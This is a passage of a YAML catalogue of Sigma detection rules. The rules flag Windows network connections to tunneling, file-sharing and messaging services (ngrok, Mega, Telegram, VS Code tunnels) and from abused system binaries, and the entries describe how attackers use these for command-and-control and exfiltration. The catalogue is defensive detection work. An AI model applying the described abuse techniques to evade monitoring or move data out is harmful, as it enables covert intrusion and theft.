  - https://github.com/looCiprian/GC2-sheet
  - https://youtu.be/n2dFlSaBBKo
  - https://services.google.com/fh/files/blogs/gcat_threathorizons_full_apr2023.pdf
  - https://www.tanium.com/blog/apt41-deploys-google-gc2-for-attacks-cyber-threat-intelligence-roundup/
  - https://www.bleepingcomputer.com/news/security/hackers-abuse-google-command-and-control-red-team-tool-in-attacks/
  false_positives:
  - Legitimate applications communicating with the "googleapis.com" endpoints that
    are not already in the exclusion list. This is environmental dependent and requires
    further testing and tuning.
  notes: ''
- detection_id: 3ab65069-d82a-4d44-a759-466661a082d1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_domain_localtonet_tunnel.yml
  name: Communication To LocaltoNet Tunneling Service Initiated
  description: 'Detects an executable initiating a network connection to "LocaltoNet"
    tunneling sub-domains.

    LocaltoNet is a reverse proxy that enables localhost services to be exposed to
    the Internet.

    Attackers have been seen to use this service for command-and-control activities
    to bypass MFA and perimeter controls.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics: []
  techniques:
  - T1090
  - T1102
  - T1572
  tags:
  - attack.command-and-control
  - attack.t1572
  - attack.t1090
  - attack.t1102
  time_window: ''
  references:
  - https://localtonet.com/documents/supported-tunnels
  - https://cloud.google.com/blog/topics/threat-intelligence/unc3944-targets-saas-applications
  false_positives:
  - Legitimate use of the LocaltoNet service.
  notes: ''
- detection_id: fdeebdf0-9f3f-4d08-84a6-4c4d13e39fe4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_domain_mega_nz.yml
  name: Network Connection Initiated To Mega.nz
  description: 'Detects a network connection initiated by a binary to "api.mega.co.nz".

    Attackers were seen abusing file sharing websites similar to "mega.nz" in order
    to upload/download additional payloads.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1567.002
  tags:
  - attack.exfiltration
  - attack.t1567.002
  time_window: ''
  references:
  - https://megatools.megous.com/
  - https://www.mandiant.com/resources/russian-targeting-gov-business
  false_positives:
  - Legitimate MEGA installers and utilities are expected to communicate with this
    domain. Exclude hosts that are known to be allowed to use this tool.
  notes: ''
- detection_id: 18249279-932f-45e2-b37a-8925f2597670
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_domain_ngrok.yml
  name: Process Initiated Network Connection To Ngrok Domain
  description: 'Detects an executable initiating a network connection to "ngrok" domains.

    Attackers were seen using this "ngrok" in order to store their second stage payloads
    and malware.

    While communication with such domains can be legitimate, often times is a sign
    of either data exfiltration by malicious actors or additional download.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1102
  - T1567
  - T1572
  tags:
  - attack.exfiltration
  - attack.command-and-control
  - attack.t1567
  - attack.t1572
  - attack.t1102
  time_window: ''
  references:
  - https://ngrok.com/
  - https://ngrok.com/blog-post/new-ngrok-domains
  - https://www.virustotal.com/gui/file/cca0c1182ac114b44dc52dd2058fcd38611c20bb6b5ad84710681d38212f835a/
  - https://www.rnbo.gov.ua/files/2023_YEAR/CYBERCENTER/november/APT29%20attacks%20Embassies%20using%20CVE-2023-38831%20-%20report%20en.pdf
  false_positives:
  - Legitimate use of the ngrok service.
  notes: ''
- detection_id: 1d08ac94-400d-4469-a82f-daee9a908849
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_domain_ngrok_tunnel.yml
  name: Communication To Ngrok Tunneling Service Initiated
  description: 'Detects an executable initiating a network connection to "ngrok" tunneling
    domains.

    Attackers were seen using this "ngrok" in order to store their second stage payloads
    and malware.

    While communication with such domains can be legitimate, often times is a sign
    of either data exfiltration by malicious actors or additional download.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1090
  - T1102
  - T1567
  - T1568.002
  - T1572
  tags:
  - attack.exfiltration
  - attack.command-and-control
  - attack.t1567
  - attack.t1568.002
  - attack.t1572
  - attack.t1090
  - attack.t1102
  - attack.s0508
  time_window: ''
  references:
  - https://twitter.com/hakluke/status/1587733971814977537/photo/1
  - https://ngrok.com/docs/secure-tunnels/tunnels/ssh-reverse-tunnel-agent
  false_positives:
  - Legitimate use of the ngrok service.
  notes: ''
- detection_id: 7e9cf7b6-e827-11ed-a05b-15959c120003
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_domain_notion_api_susp_communication.yml
  name: Potentially Suspicious Network Connection To Notion API
  description: Detects a non-browser process communicating with the Notion API. This
    could indicate potential use of a covert C2 channel such as "OffensiveNotion C2"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics: []
  techniques:
  - T1102
  tags:
  - attack.command-and-control
  - attack.t1102
  time_window: ''
  references:
  - https://github.com/mttaggart/OffensiveNotion
  - https://medium.com/@huskyhacks.mk/we-put-a-c2-in-your-notetaking-app-offensivenotion-3e933bace332
  false_positives:
  - Legitimate applications communicating with the "api.notion.com" endpoint that
    are not already in the exclusion list. The desktop and browser applications do
    not appear to be using the API by default unless integrations are configured.
  notes: ''
- detection_id: 07837ab9-60e1-481f-a74d-c31fb496a94c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_domain_portmap.yml
  name: Network Communication Initiated To Portmap.IO Domain
  description: Detects an executable accessing the portmap.io domain, which could
    be a sign of forbidden C2 traffic or data exfiltration by malicious actors
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1041
  - T1090.002
  tags:
  - attack.t1041
  - attack.command-and-control
  - attack.t1090.002
  - attack.exfiltration
  time_window: ''
  references:
  - https://portmap.io/
  - https://github.com/rapid7/metasploit-framework/issues/11337
  - https://pro.twitter.com/JaromirHorejsi/status/1795001037746761892/photo/2
  false_positives:
  - Legitimate use of portmap.io domains
  notes: ''
- detection_id: c3dbbc9f-ef1d-470a-a90a-d343448d5875
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_domain_telegram_api_non_browser_access.yml
  name: Suspicious Non-Browser Network Communication With Telegram API
  description: Detects an a non-browser process interacting with the Telegram API
    which could indicate use of a covert C2
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1102
  - T1105
  - T1567
  tags:
  - attack.command-and-control
  - attack.exfiltration
  - attack.t1102
  - attack.t1567
  - attack.t1105
  time_window: ''
  references:
  - https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/small-sieve/NCSC-MAR-Small-Sieve.pdf
  false_positives:
  - Legitimate applications communicating with the Telegram API e.g. web browsers
    not in the exclusion list, app with an RSS  etc.
  notes: ''
- detection_id: 4b657234-038e-4ad5-997c-4be42340bce4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_domain_vscode_tunnel_connection.yml
  name: Network Connection Initiated To Visual Studio Code Tunnels Domain
  description: 'Detects network connections to Visual Studio Code tunnel domains initiated
    by a process on a system. Attackers can abuse that feature to establish a reverse
    shell or persistence on a machine.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1567
  - T1572
  tags:
  - attack.exfiltration
  - attack.command-and-control
  - attack.t1567
  - attack.t1572
  time_window: ''
  references:
  - https://ipfyx.fr/post/visual-studio-code-tunnel/
  - https://badoption.eu/blog/2023/01/31/code_c2.html
  - https://cydefops.com/vscode-data-exfiltration
  false_positives:
  - Legitimate use of Visual Studio Code tunnel will also trigger this.
  notes: ''
- detection_id: a66bc059-c370-472c-a0d7-f8fd1bf9d583
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_eqnedt.yml
  name: Network Connection Initiated By Eqnedt32.EXE
  description: Detects network connections from the Equation Editor process "eqnedt32.exe".
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1203
  tags:
  - attack.execution
  - attack.t1203
  time_window: ''
  references:
  - https://twitter.com/forensicitguy/status/1513538712986079238
  - https://forensicitguy.github.io/xloader-formbook-velvetsweatshop-spreadsheet/
  - https://news.sophos.com/en-us/2019/07/18/a-new-equation-editor-exploit-goes-commercial-as-maldoc-attacks-using-it-spike/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 2fdaf50b-9fd5-449f-ba69-f17248119af6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_finger.yml
  name: Network Connection Initiated via Finger.EXE
  description: 'Detects network connections via finger.exe, which can be abused by
    threat actors to retrieve remote commands for execution on Windows devices.

    In one ClickFix malware campaign, adversaries leveraged the finger protocol to
    fetch commands from a remote server.

    Since the finger utility is not commonly used in modern Windows environments,
    its presence already raises suspicion.

    Investigating such network connections can also help identify potential malicious
    infrastructure used by threat actors

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.003
  - T1071.004
  tags:
  - attack.command-and-control
  - attack.t1071.004
  - attack.execution
  - attack.t1059.003
  time_window: ''
  references:
  - https://www.bleepingcomputer.com/news/security/decades-old-finger-protocol-abused-in-clickfix-malware-attacks/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 8d7e392e-9b28-49e1-831d-5949c6281228
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_imewdbld.yml
  name: Network Connection Initiated By IMEWDBLD.EXE
  description: 'Detects a network connection initiated by IMEWDBLD.EXE. This might
    indicate potential abuse of the utility as a LOLBIN in order to download arbitrary
    files or additional payloads.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics: []
  techniques:
  - T1105
  tags:
  - attack.command-and-control
  - attack.t1105
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1105/T1105.md#atomic-test-10---windows---powershell-download
  - https://lolbas-project.github.io/lolbas/Binaries/IMEWDBLD/
  false_positives:
  - Unknown
  notes: ''
- detection_id: e81528db-fc02-45e8-8e98-4e84aba1f10b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_notepad.yml
  name: Network Connection Initiated Via Notepad.EXE
  description: 'Detects a network connection that is initiated by the "notepad.exe"
    process.

    This might be a sign of process injection from a beacon process or something similar.

    Notepad rarely initiates a network communication except when printing documents
    for example.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1055
  tags:
  - attack.privilege-escalation
  - attack.command-and-control
  - attack.execution
  - attack.defense-evasion
  - attack.t1055
  time_window: ''
  references:
  - https://web.archive.org/web/20200219102749/https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1492186586.pdf
  - https://www.cobaltstrike.com/blog/why-is-notepad-exe-connecting-to-the-internet
  false_positives:
  - Printing documents via notepad might cause communication with the printer via
    port 9100 or similar.
  notes: ''
- detection_id: 75e33ce3-ae32-4dcc-9aa8-a2a3029d6f84
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_office_outbound_non_local_ip.yml
  name: Office Application Initiated Network Connection To Non-Local IP
  description: 'Detects an office application (Word, Excel, PowerPoint)  that initiate
    a network connection to a non-private IP addresses.

    This rule aims to detect traffic similar to one seen exploited in CVE-2021-42292.

    This rule will require an initial baseline and tuning that is specific to your
    organization.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1203
  tags:
  - attack.execution
  - attack.t1203
  time_window: ''
  references:
  - https://corelight.com/blog/detecting-cve-2021-42292
  - https://learn.microsoft.com/de-de/microsoft-365/enterprise/urls-and-ip-address-ranges?view=o365-worldwide
  false_positives:
  - You may have to tune certain domains out that Excel may call out to, such as microsoft
    or other business use case domains.
  - Office documents commonly have templates that refer to external addresses, like
    "sharepoint.ourcompany.com" may have to be tuned.
  - It is highly recommended to baseline your activity and tune out common business
    use cases.
  notes: ''
- detection_id: 3b5ba899-9842-4bc2-acc2-12308498bf42
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_office_uncommon_ports.yml
  name: Office Application Initiated Network Connection Over Uncommon Ports
  description: Detects an office suit application (Word, Excel, PowerPoint, Outlook)
    communicating to target systems over uncommon ports.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  - attack.command-and-control
  time_window: ''
  references:
  - https://blogs.blackberry.com/en/2023/07/romcom-targets-ukraine-nato-membership-talks-at-nato-summit
  false_positives:
  - Other ports can be used, apply additional filters accordingly
  notes: ''
- detection_id: bef0bc5a-b9ae-425d-85c6-7b2d705980c6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_python.yml
  name: Python Initiated Connection
  description: Detects a Python process initiating a network connection. While this
    often relates to package installation, it can also indicate a potential malicious
    script communicating with a C&C server.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1046
  tags:
  - attack.discovery
  - attack.t1046
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1046/T1046.md#atomic-test-4---port-scan-using-python
  - https://pypi.org/project/scapy/
  false_positives:
  - Legitimate python scripts using the socket library or similar will trigger this.
    Apply additional filters and perform an initial baseline before deploying.
  notes: ''
- detection_id: ed74fe75-7594-4b4b-ae38-e38e3fd2eb23
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_rdp_outbound_over_non_standard_tools.yml
  name: Outbound RDP Connections Over Non-Standard Tools
  description: 'Detects Non-Standard tools initiating a connection over port 3389
    indicating possible lateral movement.

    An initial baseline is required before using this utility to exclude third party
    RDP tooling that you might use.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics: []
  techniques:
  - T1021.001
  tags:
  - attack.lateral-movement
  - attack.t1021.001
  - car.2013-07-002
  time_window: ''
  references:
  - https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708
  false_positives:
  - Third party RDP tools
  notes: ''
- detection_id: 5f699bc5-5446-4a4a-a0b7-5ef2885a3eb4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_rdp_reverse_tunnel.yml
  name: RDP Over Reverse SSH Tunnel
  description: Detects svchost hosting RDP termsvcs communicating with the loopback
    address and on TCP port 3389
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics: []
  techniques:
  - T1021.001
  - T1572
  tags:
  - attack.command-and-control
  - attack.t1572
  - attack.lateral-movement
  - attack.t1021.001
  - car.2013-07-002
  time_window: ''
  references:
  - https://twitter.com/cyb3rops/status/1096842275437625346
  false_positives:
  - Unknown
  notes: ''
- detection_id: b1e5da3b-ca8e-4adf-915c-9921f3d85481
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_rdp_to_http.yml
  name: RDP to HTTP or HTTPS Target Ports
  description: Detects svchost hosting RDP termsvcs communicating to target systems
    on TCP port 80 or 443
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics: []
  techniques:
  - T1021.001
  - T1572
  tags:
  - attack.command-and-control
  - attack.t1572
  - attack.lateral-movement
  - attack.t1021.001
  - car.2013-07-002
  time_window: ''
  references:
  - https://twitter.com/tekdefense/status/1519711183162556416?s=12&t=OTsHCBkQOTNs1k3USz65Zg
  - https://www.mandiant.com/resources/bypassing-network-restrictions-through-rdp-tunneling
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0531e43a-d77d-47c2-b89f-5fe50321c805
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_regasm_network_activity.yml
  name: RegAsm.EXE Initiating Network Connection To Public IP
  description: Detects "RegAsm.exe" initiating a network connection to public IP adresses
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics: []
  techniques:
  - T1218.009
  tags:
  - attack.defense-evasion
  - attack.t1218.009
  time_window: ''
  references:
  - https://app.any.run/tasks/ec207948-4916-47eb-a0f4-4c6abb2e7668/
  - https://research.splunk.com/endpoint/07921114-6db4-4e2e-ae58-3ea8a52ae93f/
  - https://lolbas-project.github.io/lolbas/Binaries/Regasm/
  false_positives:
  - Unknown
  notes: ''
- detection_id: c7e91a02-d771-4a6d-a700-42587e0b1095
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_regsvr32_network_activity.yml
  name: Network Connection Initiated By Regsvr32.EXE
  description: Detects a network connection initiated by "Regsvr32.exe"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1218.010
  - T1559.001
  tags:
  - attack.execution
  - attack.t1559.001
  - attack.defense-evasion
  - attack.t1218.010
  time_window: ''
  references:
  - https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/
  - https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/
  false_positives:
  - Unknown
  notes: ''
- detection_id: d58ba5c6-0ed7-4b9d-a433-6878379efda9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_remote_access_tools_anydesk_incoming_connection.yml
  name: Remote Access Tool - AnyDesk Incoming Connection
  description: 'Detects incoming connections to AnyDesk. This could indicate a potential
    remote attacker trying to connect to a listening instance of AnyDesk and use it
    as potential command and control channel.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: experimental
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1219.002
  tags:
  - attack.persistence
  - attack.command-and-control
  - attack.t1219.002
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1219/T1219.md#atomic-test-2---anydesk-files-detected-test-on-windows
  - https://asec.ahnlab.com/en/40263/
  false_positives:
  - Legitimate incoming connections (e.g. sysadmin activity). Most of the time I would
    expect outgoing connections (initiated locally).
  notes: ''
- detection_id: cdc8da7d-c303-42f8-b08c-b4ab47230263
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_rundll32_net_connections.yml
  name: Rundll32 Internet Connection
  description: Detects a rundll32 that communicates with public IP addresses
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1218.011
  tags:
  - attack.defense-evasion
  - attack.t1218.011
  - attack.execution
  time_window: ''
  references:
  - https://www.hybrid-analysis.com/sample/759fb4c0091a78c5ee035715afe3084686a8493f39014aea72dae36869de9ff6?environmentId=100
  false_positives:
  - Communication to other corporate systems that use IP addresses from public address
    spaces
  notes: ''
- detection_id: 50e54b8d-ad73-43f8-96a1-5191685b17a4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_silenttrinity_stager_msbuild_activity.yml
  name: Silenttrinity Stager Msbuild Activity
  description: Detects a possible remote connections to Silenttrinity c2
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1127.001
  tags:
  - attack.execution
  - attack.defense-evasion
  - attack.t1127.001
  time_window: ''
  references:
  - https://www.blackhillsinfosec.com/my-first-joyride-with-silenttrinity/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 20384606-a124-4fec-acbb-8bd373728613
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_susp_binary_no_cmdline.yml
  name: Suspicious Network Connection Binary No CommandLine
  description: Detects suspicious network connections made by a well-known Windows
    binary run with no command line parameters
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://redcanary.com/blog/raspberry-robin/
  false_positives:
  - Unknown
  notes: ''
- detection_id: e0f8ab85-0ac9-423b-a73a-81b3c7b1aa97
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_susp_file_sharing_domains_susp_folders.yml
  name: Network Communication Initiated To File Sharing Domains From Process Located
    In Suspicious Folder
  description: Detects executables located in potentially suspicious directories initiating
    network connections towards file sharing domains.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics: []
  techniques:
  - T1105
  tags:
  - attack.command-and-control
  - attack.t1105
  time_window: ''
  references:
  - https://twitter.com/M_haggis/status/900741347035889665
  - https://twitter.com/M_haggis/status/1032799638213066752
  - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ransomware-hive-conti-avoslocker
  - https://www.cisa.gov/uscert/ncas/alerts/aa22-321a
  - https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/data/module_source/exfil/Invoke-ExfilDataToGitHub.ps1
  false_positives:
  - Some installers located in the temp directory might communicate with the Github
    domains in order to download additional software. Baseline these cases or move
    the github domain to a lower level hunting rule.
  notes: ''
- detection_id: 7b434893-c57d-4f41-908d-6a17bf1ae98f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_susp_initiated_uncommon_or_suspicious_locations.yml
  name: Network Connection Initiated From Process Located In Potentially Suspicious
    Or Uncommon Location
  description: 'Detects a network connection initiated by programs or processes running
    from suspicious or uncommon files system locations.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics: []
  techniques:
  - T1105
  tags:
  - attack.command-and-control
  - attack.t1105
  time_window: ''
  references:
  - https://docs.google.com/spreadsheets/d/17pSTDNpa0sf6pHeRhusvWG6rThciE8CsXTSlDUAZDyo
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4b89abaa-99fe-4232-afdd-8f9aa4d20382
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_susp_malware_callback_port.yml
  name: Potentially Suspicious Malware Callback Communication
  description: 'Detects programs that connect to known malware callback ports based
    on statistical analysis from two different sandbox system databases

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1571
  tags:
  - attack.persistence
  - attack.command-and-control
  - attack.t1571
  time_window: ''
  references:
  - https://docs.google.com/spreadsheets/d/17pSTDNpa0sf6pHeRhusvWG6rThciE8CsXTSlDUAZDyo
  false_positives:
  - Unknown
  notes: ''
- detection_id: 6d8c3d20-a5e1-494f-8412-4571d716cf5c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_susp_malware_callback_ports_uncommon.yml
  name: Communication To Uncommon Destination Ports
  description: Detects programs that connect to uncommon destination ports
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1571
  tags:
  - attack.persistence
  - attack.command-and-control
  - attack.t1571
  time_window: ''
  references:
  - https://docs.google.com/spreadsheets/d/17pSTDNpa0sf6pHeRhusvWG6rThciE8CsXTSlDUAZDyo
  false_positives:
  - Unknown
  notes: ''
- detection_id: e54979bd-c5f9-4d6c-967b-a04b19ac4c74
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_susp_outbound_kerberos_connection.yml
  name: Uncommon Outbound Kerberos Connection
  description: 'Detects uncommon outbound network activity via Kerberos default port
    indicating possible lateral movement or first stage PrivEsc via delegation.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics: []
  techniques:
  - T1550.003
  - T1558
  tags:
  - attack.defense-evasion
  - attack.credential-access
  - attack.t1558
  - attack.lateral-movement
  - attack.t1550.003
  time_window: ''
  references:
  - https://github.com/GhostPack/Rubeus
  false_positives:
  - Web Browsers and third party application might generate similar activity. An initial
    baseline is required.
  notes: ''
- detection_id: 9f2cc74d-78af-4eb2-bb64-9cd1d292b87b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/network_connection/net_connection_win_susp_outbound_mobsync_connection.yml
  name: Microsoft Sync Center Suspicious Network Connections
  description: Detects suspicious connections from Microsoft Sync Center to non-private
    IPs.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics:
  - Execution
